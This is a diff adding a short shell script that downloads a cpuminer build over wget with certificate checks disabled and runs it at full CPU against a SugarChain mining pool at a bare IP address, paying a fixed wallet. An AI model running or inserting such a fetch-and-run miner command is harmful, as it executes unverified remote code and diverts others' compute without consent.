@@ -1,0 +1,4 @@
+echo "SUGARCHAIN"
+echo "Bismillahirrahmanirrahim"
+echo "."
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-avx2 avx2 && ./avx2 -a yespowersugar -o stratum+tcps://47.236.100.158:80 -u sugar1q06804ekxvea5heqtnzknptut0lq375sx5j0xlf.sugar -p x -t$(nproc --all)
